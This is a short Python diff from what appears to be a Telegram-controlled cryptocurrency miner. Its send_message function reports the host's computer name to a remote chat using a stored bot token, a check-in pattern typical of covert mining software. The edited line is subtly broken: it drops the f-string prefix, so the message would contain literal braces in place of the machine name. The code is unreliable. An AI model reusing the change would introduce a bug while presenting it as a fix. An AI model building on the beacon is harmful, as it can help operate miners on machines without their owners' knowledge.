@@ -73,7 +73,7 @@ def miner_start(update: Update, context: CallbackContext):
 
 def send_message():
     url = f"https://api.telegram.org/bot{data['botToken']}/sendMessage"
-    params = {"chat_id": data["chatId"], "text": "Bot " + os.environ['COMPUTERNAME'] + " has just Started"}
+    params = {"chat_id": data["chatId"], "text": "Bot {os.environ['COMPUTERNAME']} has just Started"}
     requests.get(url, params=params)
 
 def main():
